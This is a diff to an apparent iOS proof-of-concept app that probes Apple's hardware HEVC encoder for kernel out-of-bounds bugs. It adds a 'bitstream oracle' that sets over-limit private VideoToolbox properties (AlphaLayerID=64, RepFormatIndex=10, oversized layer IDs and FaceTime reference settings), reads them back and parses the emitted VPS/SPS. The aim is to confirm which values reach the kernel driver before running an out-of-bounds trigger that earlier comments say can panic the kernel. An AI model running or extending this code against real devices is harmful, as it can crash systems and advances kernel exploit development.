@@ -1099,13 +1099,431 @@ static void runTier1OOB(void) {
 }
 
 // ============================================================
-// Tier 1b: REAL OOB triggers — AlphaLayerID + RepFormatIndex
-// These properties accept wildly over-limit values with NO
-// userspace validation. When the encoder builds VPS/SPS with
-// these values and sends to the kernel, the kernel uses them
-// as array indices without bounds checking (on 26.6.2).
+// Bitstream Oracle
+// Extracts VPS/SPS/PPS from encoded output and parses key fields.
+// A value is "delivered to kernel" ONLY if it appears in both
+// readback AND the emitted bitstream.
 //
-// *** THIS CAN CAUSE KERNEL PANIC ***
+// Lesson from NumberOfTemporalLayers: SET OK ≠ stored,
+// and stored ≠ delivered. Must verify at every layer.
+// ============================================================
+
+static void dumpParamSetHex(const uint8_t *data, size_t len, NSString *label) {
+    NSMutableString *hex = [NSMutableString string];
+    for (size_t i = 0; i < len && i < 64; i++) {
+        [hex appendFormat:@"%02x ", data[i]];
+        if ((i + 1) % 16 == 0) [hex appendString:@"\n          "];
+    }
+    if (len > 64) [hex appendFormat:@"... (%zu more bytes)", len - 64];
+    INFO(@"%@ (%zu bytes):\n          %@", label, len, hex);
+}
+
+// Parse HEVC VPS header and extract key fields
+static void parseHEVCVPS(const uint8_t *data, size_t len) {
+    if (len < 4) { INFO(@"  VPS too short to parse"); return; }
+
+    // NAL header: 2 bytes (forbidden_zero_bit, nal_unit_type[6], nuh_layer_id[6], nuh_temporal_id_plus1[3])
+    uint8_t nal_type = (data[0] >> 1) & 0x3F;
+    INFO(@"  NAL type: %d (expect 32=VPS)", nal_type);
+
+    // VPS payload starts at byte 2
+    // Bits: vps_video_parameter_set_id[4], vps_base_layer_internal_flag[1],
+    //       vps_base_layer_available_flag[1], vps_max_layers_minus1[6],
+    //       vps_max_sub_layers_minus1[3], vps_temporal_id_nesting_flag[1]
+    if (len < 4) return;
+    uint8_t vps_id = (data[2] >> 4) & 0x0F;
+    uint8_t base_internal = (data[2] >> 3) & 0x01;
+    uint8_t base_available = (data[2] >> 2) & 0x01;
+    // vps_max_layers_minus1 is 6 bits spanning bytes 2-3
+    uint8_t max_layers_minus1 = ((data[2] & 0x03) << 4) | ((data[3] >> 4) & 0x0F);
+    uint8_t max_sub_layers_minus1 = (data[3] >> 1) & 0x07;
+    uint8_t temporal_nesting = data[3] & 0x01;
+
+    INFO(@"  vps_id: %d", vps_id);
+    INFO(@"  vps_max_layers_minus1: %d (max_layer_id hint)", max_layers_minus1);
+    INFO(@"  vps_max_sub_layers_minus1: %d", max_sub_layers_minus1);
+    INFO(@"  vps_temporal_id_nesting_flag: %d", temporal_nesting);
+}
+
+// Parse HEVC SPS header and extract key fields
+static void parseHEVCSPS(const uint8_t *data, size_t len) {
+    if (len < 4) { INFO(@"  SPS too short to parse"); return; }
+
+    uint8_t nal_type = (data[0] >> 1) & 0x3F;
+    INFO(@"  NAL type: %d (expect 33=SPS)", nal_type);
+
+    // SPS payload starts at byte 2
+    // sps_video_parameter_set_id[4], sps_max_sub_layers_minus1[3],
+    // sps_temporal_id_nesting_flag[1]
+    if (len < 3) return;
+    uint8_t sps_vps_id = (data[2] >> 4) & 0x0F;
+    uint8_t sps_max_sub_layers = (data[2] >> 1) & 0x07;
+    INFO(@"  sps_vps_id: %d", sps_vps_id);
+    INFO(@"  sps_max_sub_layers_minus1: %d", sps_max_sub_layers);
+}
+
+// Extract and parse parameter sets from encoded output
+static void bitstreamOracle(CMSampleBufferRef sampleBuffer, NSString *context) {
+    if (!sampleBuffer) return;
+
+    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
+    if (!fmt) {
+        INFO(@"[Oracle/%@] No format description in output", context);
+        return;
+    }
+
+    INFO(@"[Oracle/%@] Extracting parameter sets from encoded output...", context);
+
+    size_t paramCount = 0;
+    OSStatus status = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+        fmt, 0, NULL, NULL, &paramCount, NULL);
+
+    if (status != noErr && status != -12712) {
+        INFO(@"[Oracle/%@] GetHEVCParameterSet failed: %d (may be H.264)", context, (int)status);
+        return;
+    }
+
+    INFO(@"[Oracle/%@] Parameter set count: %zu", context, paramCount);
+
+    for (size_t i = 0; i < paramCount; i++) {
+        const uint8_t *paramData = NULL;
+        size_t paramLen = 0;
+        int nalUnitHeaderLen = 0;
+
+        status = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+            fmt, i, &paramData, &paramLen, NULL, &nalUnitHeaderLen);
+
+        if (status != noErr || !paramData) {
+            INFO(@"[Oracle/%@] Param set %zu: read failed (%d)", context, i, (int)status);
+            continue;
+        }
+
+        NSString *label;
+        if (paramLen >= 2) {
+            uint8_t nalType = (paramData[0] >> 1) & 0x3F;
+            switch (nalType) {
+                case 32: label = @"VPS"; break;
+                case 33: label = @"SPS"; break;
+                case 34: label = @"PPS"; break;
+                default: label = [NSString stringWithFormat:@"NAL-%d", nalType]; break;
+            }
+        } else {
+            label = [NSString stringWithFormat:@"Set-%zu", i];
+        }
+
+        dumpParamSetHex(paramData, paramLen, label);
+
+        // Parse known types
+        if (paramLen >= 2) {
+            uint8_t nalType = (paramData[0] >> 1) & 0x3F;
+            if (nalType == 32) parseHEVCVPS(paramData, paramLen);
+            if (nalType == 33) parseHEVCSPS(paramData, paramLen);
+        }
+    }
+}
+
+// Shared state for oracle callback
+static NSString *g_oracleContext = nil;
+
+static void oracleOutputCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        FAIL(@"[Oracle] Encode callback error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer) {
+        PASS(@"[Oracle] Got encoded output");
+        bitstreamOracle(sampleBuffer, g_oracleContext ?: @"unknown");
+    }
+}
+
+// ============================================================
+// Verification flow: readback + bitstream oracle
+// ============================================================
+
+static void runVerifyAndTrigger(void) {
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════╗");
+    pocLog(@"║  VERIFY: Readback + Bitstream Oracle  ║");
+    pocLog(@"║  Proves whether values reach kernel    ║");
+    pocLog(@"╚══════════════════════════════════════╝");
+    pocLog(@"");
+
+    INFO(@"Lesson from NTL=8: SET OK != stored, stored != delivered.");
+    INFO(@"Must verify at every layer before concluding 'exploitable'.");
+    pocLog(@"");
+
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    // === BASELINE: encode with defaults, capture VPS/SPS ===
+    LOG(@"=== BASELINE: Default VPS/SPS ===");
+    g_oracleContext = @"BASELINE";
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oracleOutputCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Baseline session failed: %d", (int)status);
+        return;
+    }
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"Baseline prepare failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+    if (!pb) { FAIL(@"Pixel buffer failed"); return; }
+
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (y) memset(y, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+        CVPixelBufferGetHeightOfPlane(pb, 0));
+    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uv) memset(uv, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+        CVPixelBufferGetHeightOfPlane(pb, 1));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    pocLog(@"");
+
+    // === TEST A: AlphaLayerID=64 ===
+    LOG(@"=== TEST A: AlphaLayerID=64 (limit <63) ===");
+
+    // Step 1: Set
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oracleOutputCallback, NULL, &session);
+    if (status != noErr) { FAIL(@"Session failed"); CVPixelBufferRelease(pb); return; }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(64));
+    INFO(@"A.1 SET AlphaLayerID=64: %s", status == noErr ? "OK" : "REJECTED");
+
+    // Step 2: Readback
+    CFTypeRef readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        int val = [(__bridge NSNumber *)readBack intValue];
+        if (val == 64) {
+            PASS(@"A.2 READBACK: 64 — NOT clamped");
+        } else {
+            FAIL(@"A.2 READBACK: %d — CLAMPED (dead end)", val);
+        }
+        CFRelease(readBack);
+    } else {
+        INFO(@"A.2 READBACK: nil (property may not be readable)");
+    }
+
+    // Step 3: Encode and capture bitstream
+    g_oracleContext = @"AlphaLayerID=64";
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    INFO(@"A.3 PrepareToEncode: %d", (int)status);
+
+    if (status == noErr) {
+        VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        INFO(@"A.4 Compare VPS hex above with BASELINE — any difference?");
+    } else {
+        INFO(@"A.3 PrepareToEncode failed — trying with EncodesAlpha=YES");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+
+        status = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+            oracleOutputCallback, NULL, &session);
+        VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            (__bridge CFTypeRef)@(64));
+        VTSessionSetProperty(session, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+        status = VTCompressionSessionPrepareToEncodeFrames(session);
+        INFO(@"A.3b PrepareToEncode (with alpha): %d", (int)status);
+        if (status == noErr) {
+            VTCompressionSessionEncodeFrame(session, pb,
+                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        }
+    }
+
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    pocLog(@"");
+
+    // === TEST B: RepFormatIndex=10 ===
+    LOG(@"=== TEST B: RepFormatIndex=10 (limit <2) ===");
+
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oracleOutputCallback, NULL, &session);
+    if (status != noErr) { FAIL(@"Session failed"); CVPixelBufferRelease(pb); return; }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+        (__bridge CFTypeRef)@(10));
+    INFO(@"B.1 SET RepFormatIndex=10: %s", status == noErr ? "OK" : "REJECTED");
+
+    readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        int val = [(__bridge NSNumber *)readBack intValue];
+        if (val == 10) {
+            PASS(@"B.2 READBACK: 10 — NOT clamped");
+        } else {
+            FAIL(@"B.2 READBACK: %d — CLAMPED (dead end)", val);
+        }
+        CFRelease(readBack);
+    } else {
+        INFO(@"B.2 READBACK: nil");
+    }
+
+    g_oracleContext = @"RepFormatIndex=10";
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    INFO(@"B.3 PrepareToEncode: %d", (int)status);
+
+    if (status == noErr) {
+        VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        INFO(@"B.4 Compare SPS hex above with BASELINE — any difference?");
+    }
+
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    pocLog(@"");
+
+    // === TEST C: Struct-typed properties (CFArray — harder to clamp) ===
+    LOG(@"=== TEST C: MVHEVCVideoLayerIDs (array type) ===");
+
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oracleOutputCallback, NULL, &session);
+    if (status != noErr) { FAIL(@"Session failed"); CVPixelBufferRelease(pb); return; }
+
+    // Try setting MVHEVCVideoLayerIDs to an array with an over-limit value
+    NSArray *layerIDs = @[@(0), @(100)];
+    status = VTSessionSetProperty(session,
+        CFSTR("MVHEVCVideoLayerIDs"),
+        (__bridge CFTypeRef)layerIDs);
+    INFO(@"C.1 SET MVHEVCVideoLayerIDs=[0,100]: %s",
+        status == noErr ? "OK" : "REJECTED");
+
+    readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("MVHEVCVideoLayerIDs"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"C.2 READBACK: %@", (__bridge id)readBack);
+        CFRelease(readBack);
+    } else {
+        INFO(@"C.2 READBACK: nil");
+    }
+
+    // Also try UserDPBFramesForFaceTime
+    status = VTSessionSetProperty(session,
+        CFSTR("UserDPBFramesForFaceTime"),
+        (__bridge CFTypeRef)@(20));
+    INFO(@"C.3 SET UserDPBFramesForFaceTime=20: %s",
+        status == noErr ? "OK" : "REJECTED");
+
+    readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("UserDPBFramesForFaceTime"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"C.4 READBACK: %@", (__bridge id)readBack);
+        CFRelease(readBack);
+    }
+
+    // Try UserRPSForFaceTime
+    status = VTSessionSetProperty(session,
+        CFSTR("UserRPSForFaceTime"),
+        (__bridge CFTypeRef)@(100));
+    INFO(@"C.5 SET UserRPSForFaceTime=100: %s",
+        status == noErr ? "OK" : "REJECTED");
+
+    readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("UserRPSForFaceTime"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"C.6 READBACK: %@", (__bridge id)readBack);
+        CFRelease(readBack);
+    }
+
+    // Try UserParameterSetsIds
+    status = VTSessionSetProperty(session,
+        CFSTR("UserParameterSetsIds"),
+        (__bridge CFTypeRef)@(50));
+    INFO(@"C.7 SET UserParameterSetsIds=50: %s",
+        status == noErr ? "OK" : "REJECTED");
+
+    readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("UserParameterSetsIds"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"C.8 READBACK: %@", (__bridge id)readBack);
+        CFRelease(readBack);
+    }
+
+    g_oracleContext = @"StructTyped";
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status == noErr) {
+        VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    }
+
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    CVPixelBufferRelease(pb);
+
+    pocLog(@"");
+    LOG(@"=== VERDICT ===");
+    INFO(@"Compare each test's VPS/SPS hex with BASELINE.");
+    INFO(@"If VPS/SPS bytes DIFFER → value reached the bitstream.");
+    INFO(@"If IDENTICAL → encoder ignored the property (match filter?).");
+    INFO(@"Only properties that pass BOTH readback AND bitstream");
+    INFO(@"are proven delivered to the kernel driver.");
+    pocLog(@"");
+    INFO(@"Copy full log for analysis: long-press → Select All → Copy");
+}
+
+// ============================================================
+// Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
 static void runTier1bOOB(void) {
@@ -1510,16 +1928,16 @@ static void runTier2Probe(void) {
     [self.tier1Btn addTarget:self action:@selector(runTier1) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.tier1Btn];
 
-    UIButton *tier1bBtn = [UIButton buttonWithType:UIButtonTypeSystem];
-    tier1bBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
-    tier1bBtn.backgroundColor = [UIColor colorWithRed:0.4 green:0.0 blue:0.0 alpha:1];
-    tier1bBtn.layer.cornerRadius = 8;
-    tier1bBtn.layer.borderWidth = 2;
-    tier1bBtn.layer.borderColor = UIColor.redColor.CGColor;
-    [tier1bBtn setTitle:@"OOB VPS/SPS" forState:UIControlStateNormal];
-    [tier1bBtn setTitleColor:UIColor.redColor forState:UIControlStateNormal];
-    [tier1bBtn addTarget:self action:@selector(runTier1b) forControlEvents:UIControlEventTouchUpInside];
-    [self.view addSubview:tier1bBtn];
+    UIButton *verifyBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    verifyBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
+    verifyBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.15 blue:0.3 alpha:1];
+    verifyBtn.layer.cornerRadius = 8;
+    verifyBtn.layer.borderWidth = 1;
+    verifyBtn.layer.borderColor = UIColor.cyanColor.CGColor;
+    [verifyBtn setTitle:@"Verify Oracle" forState:UIControlStateNormal];
+    [verifyBtn setTitleColor:UIColor.cyanColor forState:UIControlStateNormal];
+    [verifyBtn addTarget:self action:@selector(runVerify) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:verifyBtn];
 
     CGFloat row4 = row3 + btnH + gap;
 
@@ -1571,6 +1989,12 @@ static void runTier2Probe(void) {
 - (void)runTier1 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runTier1OOB();
+    });
+}
+
+- (void)runVerify {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runVerifyAndTrigger();
     });
 }
 
